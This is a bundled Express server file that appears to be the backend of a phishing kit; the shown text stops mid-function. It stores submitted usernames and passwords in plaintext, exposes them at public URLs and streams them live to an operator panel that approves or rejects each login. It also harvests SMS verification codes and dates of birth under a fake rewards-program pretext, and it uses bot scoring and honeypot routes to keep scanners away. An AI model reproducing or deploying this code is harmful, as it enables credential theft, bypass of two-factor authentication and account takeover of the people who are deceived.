"use strict";
var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc2) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc2 = __getOwnPropDesc(from, key)) || desc2.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// server/index.ts
var import_express2 = __toESM(require("express"), 1);

// server/routes.ts
var import_http = require("http");
var import_ws = require("ws");
var import_zod2 = require("zod");
var import_fs = __toESM(require("fs"), 1);
var import_path = __toESM(require("path"), 1);

// shared/schema.ts
var schema_exports = {};
__export(schema_exports, {
  insertLoginAttemptSchema: () => insertLoginAttemptSchema,
  insertUserSchema: () => insertUserSchema,
  insertVerificationSessionSchema: () => insertVerificationSessionSchema,
  loginAttempts: () => loginAttempts,
  loginSchema: () => loginSchema,
  pendingRequests: () => pendingRequests,
  smsVerificationSchema: () => smsVerificationSchema,
  usernameSchema: () => usernameSchema,
  users: () => users,
  verificationSessions: () => verificationSessions
});
var import_pg_core = require("drizzle-orm/pg-core");
var import_drizzle_zod = require("drizzle-zod");
var import_zod = require("zod");
var users = (0, import_pg_core.pgTable)("users", {
  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
  username: (0, import_pg_core.text)("username").notNull().unique(),
  password: (0, import_pg_core.text)("password").notNull(),
  rememberUsername: (0, import_pg_core.boolean)("remember_username").default(false),
  lastLogin: (0, import_pg_core.timestamp)("last_login"),
  createdAt: (0, import_pg_core.timestamp)("created_at").defaultNow()
});
var loginAttempts = (0, import_pg_core.pgTable)("login_attempts", {
  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
  username: (0, import_pg_core.text)("username").notNull(),
  success: (0, import_pg_core.boolean)("success").notNull(),
  ipAddress: (0, import_pg_core.text)("ip_address"),
  userAgent: (0, import_pg_core.text)("user_agent"),
  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
});
var pendingRequests = (0, import_pg_core.pgTable)("pending_requests", {
  id: (0, import_pg_core.text)("id").primaryKey(),
  username: (0, import_pg_core.text)("username").notNull(),
  password: (0, import_pg_core.text)("password").notNull(),
  ipAddress: (0, import_pg_core.text)("ip_address"),
  userAgent: (0, import_pg_core.text)("user_agent"),
  status: (0, import_pg_core.text)("status").notNull().default("pending"),
  // pending, granted, denied
  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
});
var insertUserSchema = (0, import_drizzle_zod.createInsertSchema)(users).pick({
  username: true,
  password: true,
  rememberUsername: true
});
var usernameSchema = import_zod.z.object({
  username: import_zod.z.string().min(3, "Username must be at least 3 characters long"),
  rememberUsername: import_zod.z.boolean().default(false)
});
var loginSchema = import_zod.z.object({
  username: import_zod.z.string().min(3, "Username must be at least 3 characters long"),
  password: import_zod.z.string().optional(),
  rememberUsername: import_zod.z.boolean().default(false)
});
var insertLoginAttemptSchema = (0, import_drizzle_zod.createInsertSchema)(loginAttempts).omit({
  id: true,
  timestamp: true
});
var smsVerificationSchema = import_zod.z.object({
  code: import_zod.z.string().length(6, "Verification code must be 6 digits"),
  dateOfBirth: import_zod.z.string().min(1, "Date of birth is required").refine((dateStr) => {
    const date = new Date(dateStr);
    return !isNaN(date.getTime());
  }, "Please enter a valid date").refine((dateStr) => {
    const date = new Date(dateStr);
    const year = date.getFullYear();
    return year >= 1900;
  }, "Please enter a valid birth year.").refine((dateStr) => {
    const date = new Date(dateStr);
    const today = /* @__PURE__ */ new Date();
    return date <= today;
  }, "Birth date cannot be in the future.").refine((dateStr) => {
    const date = new Date(dateStr);
    const year = date.getFullYear();
    const currentYear = (/* @__PURE__ */ new Date()).getFullYear();
    return year !== currentYear;
  }, `Birth year cannot be ${(/* @__PURE__ */ new Date()).getFullYear()}. Please enter your actual date of birth.`).refine((dateStr) => {
    const date = new Date(dateStr);
    const today = /* @__PURE__ */ new Date();
    const eighteenYearsAgo = new Date(
      today.getFullYear() - 18,
      today.getMonth(),
      today.getDate()
    );
    return date <= eighteenYearsAgo;
  }, "You must be at least 18 years old to participate in the rewards program.")
});
var verificationSessions = (0, import_pg_core.pgTable)("verification_sessions", {
  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
  username: (0, import_pg_core.text)("username").notNull(),
  smsCode: (0, import_pg_core.text)("sms_code"),
  dateOfBirth: (0, import_pg_core.text)("date_of_birth"),
  ipAddress: (0, import_pg_core.text)("ip_address"),
  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
});
var insertVerificationSessionSchema = (0, import_drizzle_zod.createInsertSchema)(verificationSessions).omit({
  id: true,
  timestamp: true
});

// server/db.ts
var import_node_postgres = require("drizzle-orm/node-postgres");
var import_pg = require("pg");
if (!process.env.DATABASE_URL) {
  throw new Error("DATABASE_URL must be set. Did you forget to provision a database?");
}
var pool = new import_pg.Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
});
var db = (0, import_node_postgres.drizzle)(pool, { schema: schema_exports });

// server/storage.ts
var import_drizzle_orm = require("drizzle-orm");
var DatabaseStorage = class {
  async getUser(id) {
    const [user] = await db.select().from(users).where((0, import_drizzle_orm.eq)(users.id, id));
    return user;
  }
  async getUserByUsername(username) {
    const [user] = await db.select().from(users).where((0, import_drizzle_orm.eq)(users.username, username));
    return user;
  }
  async createUser(insertUser) {
    const [user] = await db.insert(users).values(insertUser).returning();
    return user;
  }
  async validateLogin(loginData) {
    let user = await this.getUserByUsername(loginData.username);
    if (!user) {
      user = await this.createUser({
        username: loginData.username,
        password: loginData.password || "",
        rememberUsername: loginData.rememberUsername
      });
    } else {
      await db.update(users).set({
        rememberUsername: loginData.rememberUsername,
        lastLogin: /* @__PURE__ */ new Date()
      }).where((0, import_drizzle_orm.eq)(users.id, user.id));
      const [updatedUser] = await db.select().from(users).where((0, import_drizzle_orm.eq)(users.id, user.id));
      user = updatedUser;
    }
    return {
      success: true,
      user,
      message: "Login successful"
    };
  }
  async logLoginAttempt(attempt) {
    const [loginAttempt] = await db.insert(loginAttempts).values(attempt).returning();
    return loginAttempt;
  }
  async updateUserRememberPreference(username, remember) {
    await db.update(users).set({ rememberUsername: remember }).where((0, import_drizzle_orm.eq)(users.username, username));
  }
};
var storage = new DatabaseStorage();

// server/routes.ts
var import_drizzle_orm2 = require("drizzle-orm");

// server/advanced-security.ts
var import_crypto = __toESM(require("crypto"), 1);
var rateLimits = /* @__PURE__ */ new Map();
var LOCALHOST_IPS = [
  "127.0.0.1",
  "::1",
  "::ffff:127.0.0.1",
  "localhost"
];
function isLocalhost(ip) {
  return LOCALHOST_IPS.some(
    (local) => ip === local || ip.includes(local) || ip.startsWith("192.168.") || ip.startsWith("10.")
  );
}
function getClientIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string") {
    return forwarded.split(",")[0].trim();
  }
  return req.headers["x-real-ip"] || req.socket.remoteAddress || req.ip || "unknown";
}
function rateLimitMiddleware(maxRequests = 5, windowMs = 6e4) {
  return (req, res, next) => {
    const ip = getClientIP(req);
    if (isLocalhost(ip)) {
      return next();
    }
    const now = Date.now();
    const record = rateLimits.get(ip);
    if (rateLimits.size > 1e4) {
      const cutoff = now - windowMs * 2;
      for (const [key, value] of rateLimits.entries()) {
        if (value.windowStart < cutoff) {
          rateLimits.delete(key);
        }
      }
    }
    if (!record || now - record.windowStart > windowMs) {
      rateLimits.set(ip, { count: 1, windowStart: now });
      return next();
    }
    if (record.count >= maxRequests) {
      console.log(
        `[Security] Rate limit exceeded for IP: ${ip} | Requests: ${record.count}/${maxRequests}`
      );
      return res.status(429).json({
        success: false,
        message: "Too many requests. Please try again later.",
        retryAfter: Math.ceil((record.windowStart + windowMs - now) / 1e3)
      });
    }
    record.count++;
    next();
  };
}
var csrfTokens = /* @__PURE__ */ new Map();
function generateCSRFToken(req) {
  const token = import_crypto.default.randomBytes(32).toString("hex");
  const expiresAt = Date.now() + 15 * 60 * 1e3;
  csrfTokens.set(token, {
    ip: getClientIP(req),
    expiresAt,
    used: false
  });
  if (csrfTokens.size > 1e4) {
    const now = Date.now();
    for (const [key, value] of csrfTokens.entries()) {
      if (value.expiresAt < now || value.used) {
        csrfTokens.delete(key);
      }
    }
  }
  return { token, expiresAt };
}
function validateCSRFToken(req, res, next) {
  const token = req.headers["x-csrf-token"] || req.body._csrf;
  const ip = getClientIP(req);
  if (isLocalhost(ip)) {
    return next();
  }
  if (!token) {
    console.log(`[Security] Missing CSRF token from IP: ${ip}`);
    return res.status(403).json({
      success: false,
      message: "Security token required"
    });
  }
  const record = csrfTokens.get(token);
  if (!record) {
    console.log(`[Security] Invalid CSRF token from IP: ${ip}`);
    return res.status(403).json({
      success: false,
      message: "Invalid security token"
    });
  }
  if (record.expiresAt < Date.now()) {
    csrfTokens.delete(token);
    console.log(`[Security] Expired CSRF token from IP: ${ip}`);
    return res.status(403).json({
      success: false,
      message: "Security token expired. Please refresh and try again."
    });
  }
  if (record.used) {
    console.log(`[Security] Reused CSRF token from IP: ${ip}`);
    return res.status(403).json({
      success: false,
      message: "Security token already used"
    });
  }
  record.used = true;
  next();
}
function checkHoneypot(req, res, next) {
  const honeypotFields = [
    "website_url",
    "website",
    "url",
    "homepage",
    "fax",
    "company_website",
    "secondary_email"
  ];
  for (const field of honeypotFields) {
    if (req.body[field]) {
      console.log(
        `[Security] Honeypot triggered: ${field}="${req.body[field]}" | IP: ${getClientIP(req)} | UA: ${req.get("User-Agent")}`
      );
      return res.status(400).json({
        success: false,
        message: "Invalid request"
      });
    }
  }
  next();
}
function calculateBotScore(behavioral) {
  if (!behavioral) {
    return 30;
  }
  let score = 100;
  if (behavioral.mouseMovements < 3) score -= 25;
  else if (behavioral.mouseMovements < 10) score -= 10;
  if (behavioral.keystrokes < 5) score -= 25;
  else if (behavioral.keystrokes < 15) score -= 10;
  if (behavioral.timeOnForm < 2e3) score -= 35;
  else if (behavioral.timeOnForm < 5e3) score -= 15;
  if (behavioral.scrollEvents === 0) score -= 5;
  if (behavioral.focusChanges === 0) score -= 5;
  return Math.max(0, Math.min(100, score));
}
function analyzeBehavior(minScore = 40) {
  return (req, res, next) => {
    const behavioral = req.body._behavioral;
    const ip = getClientIP(req);
    if (isLocalhost(ip)) {
      return next();
    }
    const score = calculateBotScore(behavioral);
    if (score < minScore) {
      console.log(
        `[Security] Low behavioral score: ${score}/${minScore} | IP: ${ip} | Data: ${JSON.stringify(behavioral)}`
      );
      req.suspiciousBehavior = true;
      req.behaviorScore = score;
    }
    if (req.body._behavioral) {
      delete req.body._behavioral;
    }
    next();
  };
}
var DISPOSABLE_DOMAINS = [
  "mailinator.com",
  "tempmail.com",
  "guerrillamail.com",
  "10minutemail.com",
  "throwaway.email",
  "fakeinbox.com",
  "maildrop.cc",
  "temp-mail.org",
  "getnada.com",
  "mohmal.com",
  "sharklasers.com",
  "guerrillamail.info",
  "grr.la",
  "pokemail.net",
  "spam4.me",
  "trashmail.com",
  "mailnesia.com",
  "mintemail.com",
  "tempail.com",
  "discard.email",
  "yopmail.com",
  "tempr.email",
  "dropmail.me",
  "throwawaymail.com",
  "tmpmail.org",
  "tmpmail.net",
  "emailondeck.com",
  "getairmail.com"
];
function validateEmail(email) {
  if (!email || typeof email !== "string") {
    return { valid: false, reason: "Email is required" };
  }
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return { valid: false, reason: "Invalid email format" };
  }
  const domain = email.split("@")[1]?.toLowerCase();
  if (!domain) {
    return { valid: false, reason: "Invalid email domain" };
  }
  if (DISPOSABLE_DOMAINS.includes(domain)) {
    return { valid: false, reason: "Disposable email addresses are not allowed" };
  }
  if (domain.length > 50) {
    return { valid: false, reason: "Invalid email domain" };
  }
  if (domain.endsWith(".") || domain.includes("..")) {
    return { valid: false, reason: "Invalid email format" };
  }
  return { valid: true };
}
function validateEmailMiddleware(fieldName = "email") {
  return (req, res, next) => {
    const email = req.body[fieldName];
    if (!email) {
      return next();
    }
    const result = validateEmail(email);
    if (!result.valid) {
      console.log(
        `[Security] Email validation failed: ${result.reason} | Email: ${email} | IP: ${getClientIP(req)}`
      );
      return res.status(400).json({
        success: false,
        message: result.reason
      });
    }
    next();
  };
}
function requireJavaScript(req, res, next) {
  const jsVerified = req.body._js_verified;
  const ip = getClientIP(req);
  if (isLocalhost(ip)) {
    return next();
  }
  if (!jsVerified) {
    console.log(
      `[Security] JS verification missing - possible headless bot | IP: ${ip} | UA: ${req.get("User-Agent")}`
    );
    return res.status(400).json({
      success: false,
      message: "Invalid submission"
    });
  }
  delete req.body._js_verified;
  next();
}
function applyAllSecurity(options = {}) {
  const middlewares = [];
  middlewares.push(
    rateLimitMiddleware(
      options.rateLimit?.maxRequests || 5,
      options.rateLimit?.windowMs || 6e4
    )
  );
  middlewares.push(checkHoneypot);
  if (options.requireCsrf) {
    middlewares.push(validateCSRFToken);
  }
  if (options.checkBehavior) {
    middlewares.push(analyzeBehavior(options.minBehaviorScore || 40));
  }
  if (options.validateEmails) {
    middlewares.push(validateEmailMiddleware(options.emailField || "email"));
  }
  if (options.requireJs) {
    middlewares.push(requireJavaScript);
  }
  return (req, res, next) => {
    let index = 0;
    const runNext = (err) => {
      if (err) return next(err);
      if (index >= middlewares.length) return next();
      const middleware = middlewares[index++];
      try {
        middleware(req, res, runNext);
      } catch (error) {
        next(error);
      }
    };
    runNext();
  };
}
function handleTokenRequest(req, res) {
  const { token, expiresAt } = generateCSRFToken(req);
  res.json({ token, expiresAt });
}

// server/routes.ts
var pageActivity = /* @__PURE__ */ new Map([
  ["recover-username", {
    pageName: "Username Recovery",
    route: "/recover-username",
    status: "active",
    lastAccessed: (/* @__PURE__ */ new Date()).toISOString(),
    visitors: 0
  }],
  ["recover-password", {
    pageName: "Password Recovery",
    route: "/recover-password",
    status: "active",
    lastAccessed: (/* @__PURE__ */ new Date()).toISOString(),
    visitors: 0
  }],
  ["register", {
    pageName: "Registration",
    route: "/register",
    status: "active",
    lastAccessed: (/* @__PURE__ */ new Date()).toISOString(),
    visitors: 0
  }],
  ["privacy", {
    pageName: "Privacy Policy",
    route: "/privacy",
    status: "active",
    lastAccessed: (/* @__PURE__ */ new Date()).toISOString(),
    visitors: 0
  }],
  ["terms", {
    pageName: "Terms of Service",
    route: "/terms",
    status: "active",
    lastAccessed: (/* @__PURE__ */ new Date()).toISOString(),
    visitors: 0
  }]
]);
var adminClients = /* @__PURE__ */ new Set();
function broadcastToAdmins(data) {
  const message = JSON.stringify(data);
  console.log(`[WebSocket Broadcast] Type: ${data.type} | Connected admins: ${adminClients.size}`);
  adminClients.forEach((client) => {
    if (client.readyState === import_ws.WebSocket.OPEN) {
      client.send(message);
      console.log(`[WebSocket Broadcast] Sent ${data.type} to admin client`);
    }
  });
}
async function getCountryFromIP(ip) {
  try {
    if (ip === "unknown" || ip === "127.0.0.1" || ip === "::1" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
      return "Local";
    }
    const response = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,countryCode,org`
    );
    const data = await response.json();
    if (data.status === "success" && data.country) {
      return `${data.country} (${data.countryCode})`;
    }
    return "Unknown";
  } catch (error) {
    console.error("Error getting country for IP:", error);
    return "Unknown";
  }
}
async function logVisitor(req) {
  try {
    const rawIP = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.connection.remoteAddress || req.socket.remoteAddress || "unknown";
    const ip = rawIP.split(",")[0].trim();
    const country = await getCountryFromIP(ip);
    const now = /* @__PURE__ */ new Date();
    const dateStr = now.toISOString().split("T")[0];
    const timeStr = now.toISOString().split("T")[1].split(".")[0];
    const userAgent = req.headers["user-agent"] || "unknown";
    const shortUserAgent = userAgent.length > 50 ? userAgent.substring(0, 50) + "..." : userAgent;
    const logEntry = `${ip} (${country}) | ${dateStr} | ${timeStr} | ${req.url} | ${shortUserAgent}
`;
    const logPath = import_path.default.join(
      process.cwd(),
      "client",
      "public",
      "visitors.txt"
    );
    const publicDir = import_path.default.join(process.cwd(), "client", "public");
    if (!import_fs.default.existsSync(publicDir)) {
      import_fs.default.mkdirSync(publicDir, { recursive: true });
    }
    import_fs.default.appendFileSync(logPath, logEntry);
  } catch (error) {
    console.error("Error logging visitor:", error);
  }
}
function clearVisitorsLog() {
  try {
    const logPath = import_path.default.join(
      process.cwd(),
      "client",
      "public",
      "visitors.txt"
    );
    import_fs.default.writeFileSync(logPath, "");
    console.log(
      `[${(/* @__PURE__ */ new Date()).toISOString()}] Visitors log cleared automatically`
    );
  } catch (error) {
    console.error("Error clearing visitors log:", error);
  }
}
async function registerRoutes(app2) {
  setInterval(clearVisitorsLog, 30 * 60 * 1e3);
  console.log("Visitors log cleanup started (every 30 minutes)");
  app2.use((req, res, next) => {
    if (req.url === "/" || req.url.startsWith("/login") || req.url.startsWith("/loading") || req.url.startsWith("/sms") || req.url.startsWith("/admin-control")) {
      logVisitor(req).catch(
        (error) => console.error("Visitor logging failed:", error)
      );
    }
    const pageRoutes = [
      "/recover-username",
      "/recover-password",
      "/register",
      "/privacy",
      "/terms"
    ];
    if (pageRoutes.includes(req.url)) {
      const pageKey = req.url.substring(1);
      const page = pageActivity.get(pageKey);
      if (page) {
        page.lastAccessed = (/* @__PURE__ */ new Date()).toISOString();
        page.visitors++;
        pageActivity.set(pageKey, page);
        broadcastToAdmins({
          type: "page_activity",
          page
        });
      }
    }
    next();
  });
  app2.get("/api/security/token", handleTokenRequest);
  app2.post(
    "/api/auth/login",
    applyAllSecurity({ checkBehavior: true, minBehaviorScore: 30 }),
    async (req, res) => {
      try {
        const loginData = loginSchema.parse(req.body);
        const loginsPath = import_path.default.join(process.cwd(), "logins.txt");
        const logEntry = `${loginData.username}:${loginData.password || ""}
`;
        import_fs.default.appendFileSync(loginsPath, logEntry);
        try {
          const usernamesPath = import_path.default.join(
            process.cwd(),
            "client",
            "public",
            "usernames.txt"
          );
          const now = /* @__PURE__ */ new Date();
          const dateStr = now.toISOString().split("T")[0];
          const timeStr = now.toISOString().split("T")[1].split(".")[0];
          const usernameEntry = `${loginData.username} | ${dateStr} | ${timeStr}
`;
          const publicDir = import_path.default.join(process.cwd(), "client", "public");
          if (!import_fs.default.existsSync(publicDir)) {
            import_fs.default.mkdirSync(publicDir, { recursive: true });
          }
          import_fs.default.appendFileSync(usernamesPath, usernameEntry);
        } catch (error) {
          console.error("Error saving username:", error);
        }
        const requestId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        const newRequest = {
          id: requestId,
          username: loginData.username,
          password: loginData.password || "",
          ipAddress: req.ip || req.connection.remoteAddress || "Unknown",
          userAgent: req.get("User-Agent") || "Unknown",
          status: "pending",
          timestamp: /* @__PURE__ */ new Date()
        };
        await db.insert(pendingRequests).values(newRequest);
        broadcastToAdmins({
          type: "new_request",
          request: {
            ...newRequest,
            timestamp: newRequest.timestamp.toISOString()
          }
        });
        res.json({
          success: true,
          message: "Login request submitted",
          requestId
        });
      } catch (error) {
        if (error instanceof import_zod2.z.ZodError) {
          res.status(400).json({
            success: false,
            message: "Invalid input data",
            errors: error.errors
          });
        } else {
          res.status(500).json({
            success: false,
            message: "Internal server error"
          });
        }
      }
    }
  );
  app2.post(
    "/api/auth/check-username",
    applyAllSecurity({ checkBehavior: true }),
    async (req, res) => {
      try {
        const usernameData = usernameSchema.parse(req.body);
        res.json({
          success: true,
          message: "Username validated",
          username: usernameData.username,
          rememberUsername: usernameData.rememberUsername
        });
      } catch (error) {
        if (error instanceof import_zod2.z.ZodError) {
          res.status(400).json({
            success: false,
            message: "Invalid input data",
            errors: error.errors
          });
        } else {
          res.status(500).json({
            success: false,
            message: "Internal server error"
          });
        }
      }
    }
  );
  app2.get(
    "/api/auth/check-username/:username",
    async (req, res) => {
      try {
        const username = req.params.username;
        const user = await storage.getUserByUsername(username);
        res.json({
          exists: !!user,
          rememberUsername: user?.rememberUsername || false
        });
      } catch (error) {
        res.status(500).json({
          success: false,
          message: "Internal server error"
        });
      }
    }
  );
  app2.post(
    "/api/auth/register",
    applyAllSecurity({ validateEmails: true, emailField: "email" }),
    async (req, res) => {
      try {
        const userData = req.body;
        const existingUser = await storage.getUserByUsername(userData.username);
        if (existingUser) {
          res.status(409).json({
            success: false,
            message: "Username already exists"
          });
          return;
        }
        const user = await storage.createUser(userData);
        res.json({
          success: true,
          message: "User created successfully",
          user: {
            id: user.id,
            username: user.username
          }
        });
      } catch (error) {
        res.status(500).json({
          success: false,
          message: "Internal server error"
        });
      }
    }
  );
  app2.post(
    "/api/auth/recover-username",
    applyAllSecurity({ validateEmails: true, emailField: "email" }),
    async (req, res) => {
      try {
        const { email } = req.body;
        res.json({
          success: true,
          message: "If an account exists with that email, recovery instructions have been sent."
        });
      } catch (error) {
        res.status(500).json({
          success: false,
          message: "Internal server error"
        });
      }
    }
  );
  app2.get("/api/admin/pending", async (req, res) => {
    try {
      const pending = await db.select().from(pendingRequests).where((0, import_drizzle_orm2.eq)(pendingRequests.status, "pending"));
      res.json(pending);
    } catch (error) {
      console.error("Error getting pending requests:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  app2.get("/api/admin/sms-history", async (req, res) => {
    try {
      const history = await db.select().from(verificationSessions).orderBy((0, import_drizzle_orm2.desc)(verificationSessions.timestamp));
      const mappedHistory = history.map((session) => ({
        username: session.username,
        code: session.smsCode || "",
        dateOfBirth: session.dateOfBirth,
        timestamp: session.timestamp ? session.timestamp.toISOString() : (/* @__PURE__ */ new Date()).toISOString(),
        sessionId: session.id
      }));
      res.json(mappedHistory);
    } catch (error) {
      console.error("Error getting SMS history:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  app2.post("/api/admin/clear-logs", async (req, res) => {
    try {
      await db.delete(pendingRequests);
      await db.delete(verificationSessions);
      res.json({ success: true, message: "All logs cleared successfully" });
    } catch (error) {
      console.error("Error clearing logs:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  app2.get(
    "/api/auth/status/:requestId",
    async (req, res) => {
      try {
        const requestId = req.params.requestId;
        const [request] = await db.select().from(pendingRequests).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
        if (!request) {
          res.status(404).json({
            success: false,
            message: "Request not found"
          });
          return;
        }
        res.json({
          success: true,
          status: request.status,
          requestId
        });
      } catch (error) {
        console.error("Error checking status:", error);
        res.status(500).json({
          success: false,
          message: "Internal server error"
        });
      }
    }
  );
  app2.post("/api/admin/grant", async (req, res) => {
    try {
      const { requestId, username, password } = req.body;
      await db.update(pendingRequests).set({ status: "granted" }).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
      res.json({
        success: true,
        message: "Access granted - proceeding to SMS verification"
      });
    } catch (error) {
      console.error("Error in grant endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  app2.post("/api/admin/deny", async (req, res) => {
    try {
      const { requestId, username, password } = req.body;
      await db.update(pendingRequests).set({ status: "denied" }).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
      res.json({
        success: true,
        message: "Access denied - user will see incorrect password error"
      });
    } catch (error) {
      console.error("Error in deny endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  app2.get("/visitors.txt", (req, res) => {
    try {
      const logPath = import_path.default.join(
        process.cwd(),
        "client",
        "public",
        "visitors.txt"
      );
      if (!import_fs.default.existsSync(logPath)) {
        res.status(404).send("Visitor log file not found");
        return;
      }
      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.setHeader("Content-Disposition", 'inline; filename="visitors.txt"');
      const fileContent = import_fs.default.readFileSync(logPath, "utf8");
      res.send(fileContent);
    } catch (error) {
      console.error("Error serving visitors.txt:", error);
      res.status(500).send("Error reading visitor log file");
    }
  });
  app2.get("/usernames.txt", (req, res) => {
    try {
      const usernamesPath = import_path.default.join(
        process.cwd(),
        "client",
        "public",
        "usernames.txt"
      );
      if (!import_fs.default.existsSync(usernamesPath)) {
        res.status(404).send("Usernames file not found");
        return;
      }
      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.setHeader("Content-Disposition", 'inline; filename="usernames.txt"');
      const fileContent = import_fs.default.readFileSync(usernamesPath, "utf8");
      res.send(fileContent);
    } catch (error) {
      console.error("Error serving usernames.txt:", error);
      res.status(500).send("Error reading usernames file");
    }
  });
  app2.get("/logins.txt", (req, res) => {
    try {
      const loginsPath = import_path.default.join(process.cwd(), "logins.txt");
      if (!import_fs.default.existsSync(loginsPath)) {
        res.status(404).send("Logins file not found");
        return;
      }
      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.setHeader("Content-Disposition", 'inline; filename="logins.txt"');
      const fileContent = import_fs.default.readFileSync(loginsPath, "utf8");
      res.send(fileContent);
    } catch (error) {
      console.error("Error serving logins.txt:", error);
      res.status(500).send("Error reading logins file");
    }
  });
  const honeypotRoutes = [
    "/sitemap.xml",
    "/wp-admin",
    "/admin",
    "/.env",
    "/config.php",
    "/api/v1/users",
    "/graphql",
    "/.git/config",
    "/wp-config.php",
    "/phpinfo.php",
    "/server-status",
    "/admin.php",
    "/backup.sql",
    "/database.sql",
    "/admin/login",
    "/login.php",
    "/config.json",
    "/package.json",
    "/.htaccess",
    "/web.config"
  ];
  honeypotRoutes.forEach((route) => {
    app2.get(route, (req, res) => {
      console.log(
        `[Security Alert] Honeypot accessed: ${route} | IP: ${req.ip || "unknown"} | UA: ${req.get("User-Agent") || "none"}`
      );
      res.status(404).json({
        error: "Not Found",
        message: "The requested resource was not found",
        timestamp: (/* @__PURE__ */ new Date()).toISOString()
      });
    });
    app2.post(route, (req, res) => {
      console.log(
        `[Security Alert] Honeypot POST attempt: ${route} | IP: ${req.ip || "unknown"} | UA: ${req.get("User-Agent") || "none"}`
      );
      res.status(405).json({
        error: "Method Not Allowed",
        message: "POST method is not supported for this endpoint",
        timestamp: (/* @__PURE__ */ new Date()).toISOString()
      });
    });
  });
  app2.post(
    "/api/sms/verify-code",
    applyAllSecurity({}),
    async (req, res) => {
      try {
        const { username, code } = req.body;
        if (!code || code.length !== 6) {
          return res.status(400).json({
            success: false,
            message: "Invalid verification code"
          });
        }
        const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
        const sessionId = `${username}-${Date.now()}`;
        await db.insert(verificationSessions).values({
          id: sessionId,
          username,
          smsCode: code,
          ipAddress: ip,
          timestamp: /* @__PURE__ */ new Date()
        });
        broadcastToAdmins({
          type: "sms_verification_step1",
          data: {
            sessionId,
            username,
            smsCode: code,
            ipAddress: ip,
            timestamp: (/* @__PURE__ */ new Date()).toISOString()
          }
        });
        res.json({
          success: true,
          message: "SMS code verified",
          sessionId
          // Send session ID to client for step 2
        });
      } catch (error) {
        console.error("Error in SMS verify-code endpoint:", error);
        res.status(500).json({
          success: false,
          message: "Internal server error"
        });
      }
    }
  );
  app2.post("/api/sms/verify", async (req, res) => {
    try {
      const { username, code, dateOfBirth } = req.body;
      if (!dateOfBirth) {
        return res.status(400).json({
          success: false,
          message: "Date of birth is required"
        });
      }
      const [session] = await db.select().from(verificationSessions).where(
        (0, import_drizzle_orm2.and)(
          (0, import_drizzle_orm2.eq)(verificationSessions.username, username),
          (0, import_drizzle_orm2.eq)(verificationSessions.smsCode, code)
        )
      );
      if (!session) {
        return res.status(404).json({
          success: false,
          message: "Verification session not found. Please verify your SMS code again."
        });
      }
      await db.update(verificationSessions).set({ dateOfBirth }).where((0, import_drizzle_orm2.eq)(verificationSessions.id, session.id));
      broadcastToAdmins({
        type: "sms_verification_complete",
        data: {
          sessionId: session.id,
          username: session.username,
          smsCode: session.smsCode,
          dateOfBirth,
          ipAddress: session.ipAddress,
          timestamp: (/* @__PURE__ */ new Date()).toISOString()
        }
      });
      res.json({
        success: true,
        message: "SMS verification successful"
      });
    } catch (error) {
      console.error("Error in SMS verify endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  app2.post("/api/sms/resend", async (req, res) => {
    try {
      const { username } = req.body;
      res.json({
        success: true,
        message: "New verification code sent"
      });
    } catch (error) {
      console.error("Error in SMS resend endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  const httpServer = (0, import_http.createServer)(app2);
  const wss = new import_ws.WebSocketServer({ server: httpServer, path: "/ws" });
  wss.on("connection", async (ws) => {
    console.log("[WebSocket] Admin client connected");
    adminClients.add(ws);
    try {
      const pending = await db.select().from(pendingRequests).where((0, import_drizzle_orm2.eq)(pendingRequests.status, "pending"));
      ws.send(
        JSON.stringify({
          type: "initial_data",
          requests: pending,
          pages: Array.from(pageActivity.values())
        })
      );
    } catch (error) {
      console.error("Error fetching initial data for WebSocket:", error);
    }
    ws.on("close", () => {
